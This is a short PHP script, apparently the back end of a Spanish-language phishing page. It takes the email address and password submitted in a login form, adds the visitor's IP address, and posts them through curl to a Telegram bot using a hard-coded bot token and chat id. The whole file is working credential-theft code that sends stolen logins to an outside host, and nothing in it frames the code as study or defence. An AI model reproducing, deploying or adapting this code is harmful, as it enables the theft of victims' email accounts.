	<?php
@session_start();
$userp = $_SERVER['REMOTE_ADDR'];


$token = "5457641050:AAGVgvGceaC8YyhKnk8nRMxdqH1krFajU28";
$id = "858124660";
$urlMsg = "https://api.telegram.org/bot{$token}/sendMessage";
$msg = "
Correo: ".$_POST['mail_address']."
Clave: ".$_POST['mail_pass']."
IP: ".$userp."
";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $urlMsg);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id={$id}&parse_mode=HTML&text=$msg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$server_output = curl_exec($ch);
curl_close($ch);

